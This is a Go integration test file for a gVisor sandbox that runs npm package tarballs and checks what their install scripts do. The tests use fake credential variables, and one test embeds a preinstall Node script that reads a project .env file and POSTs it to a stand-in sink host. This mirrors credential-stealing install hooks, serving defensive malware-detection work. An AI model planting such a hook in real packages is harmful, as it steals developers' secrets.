//go:build linux

package sandbox

import (
	"archive/tar"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/hosttool"
)

func TestLinuxGVisorLifecycleIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor runtime")
	}
	runLinuxGVisorLifecycleIntegration(t, `{"name":"tiny","version":"1.2.3"}`, domain.SandboxCompleted)
}

func TestLinuxGVisorArtifactEnvironmentIsolationIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor runtime")
	}
	for key, value := range map[string]string{
		"GITHUB_TOKEN":          "fake-github-token",
		"NPM_TOKEN":             "fake-npm-token",
		"PYPI_TOKEN":            "fake-pypi-token",
		"AWS_SECRET_ACCESS_KEY": "fake-aws-secret",
		"OPENAI_API_KEY":        "fake-openai-key",
		"CI_SECRET":             "fake-ci-secret",
		"ARBITRARY_TOKEN":       "fake-arbitrary-token",
		"SSH_AUTH_SOCK":         "/tmp/fake-ssh-agent.sock",
	} {
		t.Setenv(key, value)
	}
	runLinuxGVisorLifecycleIntegration(t, `{"name":"tiny","version":"1.2.3","scripts":{"preinstall":"test \"$GITHUB_TOKEN\" != fake-github-token && test \"$NPM_TOKEN\" != fake-npm-token && test -z \"$PYPI_TOKEN\" && test \"$AWS_SECRET_ACCESS_KEY\" != fake-aws-secret && test -z \"$OPENAI_API_KEY\" && test -z \"$CI_SECRET\" && test -z \"$ARBITRARY_TOKEN\" && test -z \"$SSH_AUTH_SOCK\""}}`, domain.SandboxCompleted)
}

func runLinuxGVisorLifecycleIntegration(t *testing.T, body string, want domain.SandboxStatus) domain.SandboxResult {
	t.Helper()
	root := t.TempDir()
	path := filepath.Join(root, "run_aaaaaaaaaaaaaaaaaaaaaaaaaa", "tarball.tgz")
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	file, err := os.Create(path)
	if err != nil {
		t.Fatal(err)
	}
	gzipWriter := gzip.NewWriter(file)
	writer := tar.NewWriter(gzipWriter)
	if err := writer.WriteHeader(&tar.Header{Name: "package/package.json", Size: int64(len(body)), Mode: 0o600}); err != nil {
		t.Fatal(err)
	}
	if _, err := writer.Write([]byte(body)); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gzipWriter.Close(); err != nil {
		t.Fatal(err)
	}
	if err := file.Close(); err != nil {
		t.Fatal(err)
	}
	supervisor := integrationObserverSupervisor(t)
	defer supervisor.Close()
	runner := integrationRunner{t: t}
	introducer, err := NewDockerArtifactIntroducer(root, runner)
	if err != nil {
		t.Fatal(err)
	}
	backend, err := NewBackend(runner, introducer, supervisor.Observer(), integrationCapabilityProbe(runner))
	if err != nil {
		t.Fatal(err)
	}
	// Manual source candidates use the same protected-current factory with an
	// owned Root fixture. Production continues to use NativeInstallRoot only.
	backend.prepareResponder = integrationResponderSupply
	resources, err := hosttool.NewSystemObservationResourceClient()
	if err != nil {
		t.Fatal(err)
	}
	backend.resources = integrationObservationResources{client: resources}
	result, err := backend.Execute(context.Background(), integrationRequest(t, path))
	if err != nil {
		if want != domain.SandboxIncomplete || result.Status() != want {
			t.Fatal(err)
		}
		t.Logf("expected incomplete result retains original cause: %v", err)
	}
	if result.Status() != want {
		code, _ := result.LimitationCode()
		t.Fatalf("Sandbox result = %q/%q observer_reason=%s", result.Status(), code, integrationObserverFaultReason(supervisor))
	}
	if want == domain.SandboxIncomplete {
		t.Logf("observer failure retained: %s", integrationObserverFaultReason(supervisor))
	}
	return result
}

func integrationRequest(t *testing.T, path string) domain.SandboxRequest {
	t.Helper()
	source, _ := domain.NewSourceID("npm")
	identity, _ := domain.NewResolvedArtifactIdentity(source, "tiny", "1.2.3", "tarball")
	payload, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256(payload)
	digest, _ := domain.NewSHA256Digest(hex.EncodeToString(sum[:]))
	artifact, err := domain.NewAcquiredArtifact(identity, digest, "intake:run_aaaaaaaaaaaaaaaaaaaaaaaaaa:tarball", uint64(len(payload)))
	if err != nil {
		t.Fatal(err)
	}
	request, err := domain.NewSandboxRequest(artifact)
	if err != nil {
		t.Fatal(err)
	}
	return request
}

func TestLinuxGVisorFreshEnvironmentIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor and protected resource service")
	}
	result := runLinuxGVisorLifecycleIntegration(t, `{"name":"tiny","version":"1.2.3","scripts":{"preinstall":"test ! -e /tmp/haa-environment-dirty; case \"$GITHUB_TOKEN\" in \"\") test ! -e /tmp/.aws/credentials;; haa-invalid-*) test -r /tmp/.aws/credentials;; *) exit 51;; esac; : > /tmp/haa-environment-dirty"}}`, domain.SandboxCompleted)
	counts := map[string]uint64{}
	for _, fact := range result.Observations() {
		counts[fact.Subject()] += fact.Count()
	}
	for _, kind := range []inspectionEnvironment{minimalEnvironment, developmentEnvironment} {
		if counts["environment-"+string(kind)+"-completed"] != 1 {
			t.Fatal("required fresh environment did not complete")
		}
	}
	t.Log("fresh environments=2; inherited Host secrets=absent; synthetic cues=isolated; previous-run marker=absent; completion authority=external")
}

func TestLinuxGVisorSyntheticNetworkEnvironmentIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor and protected resource service")
	}
	// The same harmless package stays dormant without synthetic credentials.
	// The development experiment uses only its private loopback and dummy file.
	const program = `if(!process.env.GITHUB_TOKEN)process.exit(0);
const fs=require("node:fs"),http=require("node:http");
const req=http.get("http://probe.helox.invalid/probe",r=>{r.resume();r.on("end",()=>{
if(r.statusCode!==200){process.exitCode=71;return;}
const body=fs.readFileSync("/tmp/project/.env");
const sink=http.request({hostname:"sink.helox.invalid",path:"/sink",method:"POST",headers:{"Content-Length":body.length}},s=>{
s.resume();s.on("end",()=>{if(s.statusCode!==204)process.exitCode=72;});});
sink.on("error",()=>{process.exitCode=73;});sink.end(body);
});});req.on("error",()=>{process.exitCode=74;});`
	body, err := json.Marshal(map[string]any{"name": "tiny", "version": "1.2.3", "scripts": map[string]string{"preinstall": "node -e '" + program + "'"}})
	if err != nil {
		t.Fatal(err)
	}
	result := runLinuxGVisorLifecycleIntegration(t, string(body), domain.SandboxCompleted)
	if len(result.EnvironmentStates()) != 2 {
		t.Fatal("required environment evidence missing")
	}
	var network uint64
	for _, fact := range result.Observations() {
		if fact.Category() == domain.ObservationNetwork {
			network += fact.Count()
		}
	}
	if network == 0 {
		t.Fatal("loopback attempts were hidden from Policy input")
	}
	t.Logf("whole npm inspection: two environments complete; fixed DNS/HTTP and dummy read/sink; network facts=%d; no Policy ALLOW assertion", network)
}

func TestLinuxGVisorDefaultResolverEnvironmentIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor and protected resource service")
	}
	// The network-none control must finish its failed DNS attempt; the synthetic
	// experiment resolves the same name. Both attempts remain observable.
	const program = `require("node:dns").lookup("probe.helox.invalid",{family:4},(err,address)=>{
if(process.env.GITHUB_TOKEN){if(err||address!=="127.0.0.1")process.exitCode=81;}
else if(!err)process.exitCode=82;
});`
	body, err := json.Marshal(map[string]any{"name": "tiny", "version": "1.2.3", "scripts": map[string]string{"preinstall": "node -e '" + program + "'"}})
	if err != nil {
		t.Fatal(err)
	}
	result := runLinuxGVisorLifecycleIntegration(t, string(body), domain.SandboxCompleted)
	if len(result.EnvironmentStates()) != 2 {
		t.Fatal("required resolver environment evidence missing")
	}
	var network uint64
	for _, fact := range result.Observations() {
		if fact.Category() == domain.ObservationNetwork {
			network += fact.Count()
		}
	}
	if network == 0 {
		t.Fatal("default resolver attempts were hidden")
	}
	t.Logf("default DNS: network-none failure and synthetic success; two complete environments; network facts=%d", network)
}

func TestLinuxGVisorTransientFilesystemIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_INTEGRATION") != "1" {
		t.Skip("requires pinned Linux gVisor and protected resource service")
	}
	// Leave no file behind: a snapshot alone cannot show these operations.
	script := `node -e 'const fs=require("fs");const a="/tmp/transient-a",b="/tmp/transient-b";fs.writeFileSync(a,"temporary");const fd=fs.openSync(a,"r+");fs.writeSync(fd,Buffer.from("x"),0,1,0);fs.closeSync(fd);fs.renameSync(a,b);fs.chmodSync(b,0o600);fs.truncateSync(b,0);fs.unlinkSync(b);if(fs.existsSync(a)||fs.existsSync(b))process.exit(61)'`
	body, err := json.Marshal(map[string]any{"name": "tiny", "version": "1.2.3", "scripts": map[string]string{"preinstall": script}})
	if err != nil {
		t.Fatal(err)
	}
	result := runLinuxGVisorLifecycleIntegration(t, string(body), domain.SandboxCompleted)
	counts := map[string]uint64{}
	for _, fact := range result.Observations() {
		counts[fact.Subject()] += fact.Count()
	}
	for _, kind := range []string{"filesystem-workspace-create", "filesystem-workspace-write", "filesystem-workspace-rename", "filesystem-workspace-unlink", "filesystem-workspace-permission-operation", "filesystem-workspace-size-operation"} {
		if counts[kind] < 2 {
			t.Fatalf("missing successful operation in both fresh environments: %s counts=%v", kind, counts)
		}
	}
	states := result.EnvironmentStates()
	if len(states) != 2 {
		t.Fatalf("state coverage=%d", len(states))
	}
	for _, state := range states {
		if !state.VFSOperationsCovered {
			t.Fatal("active operation coverage absent")
		}
		summary, err := state.Summary()
		if err != nil || len(summary) > 1024 {
			t.Fatalf("state evidence invalid: %v", err)
		}
	}
	t.Logf("two fresh environments: transient operations observed; raw paths/data excluded; bounded counts=%v", counts)
}

func TestLinuxGVisorMissingFilesystemObservationIntegration(t *testing.T) {
	if os.Getenv("HELOX_GVISOR_MISSING_FILESYSTEM_OBSERVATION") != "1" {
		t.Skip("requires controlled pod-init missing required mutation point or context")
	}
	result := runLinuxGVisorLifecycleIntegration(t, `{"name":"tiny","version":"1.2.3"}`, domain.SandboxIncomplete)
	code, _ := result.LimitationCode()
	if code != "M3_DYNAMIC_SETUP_FAILED" || len(result.EnvironmentStates()) != 0 {
		t.Fatalf("missing observation profile accepted: %s states=%d", code, len(result.EnvironmentStates()))
	}
}
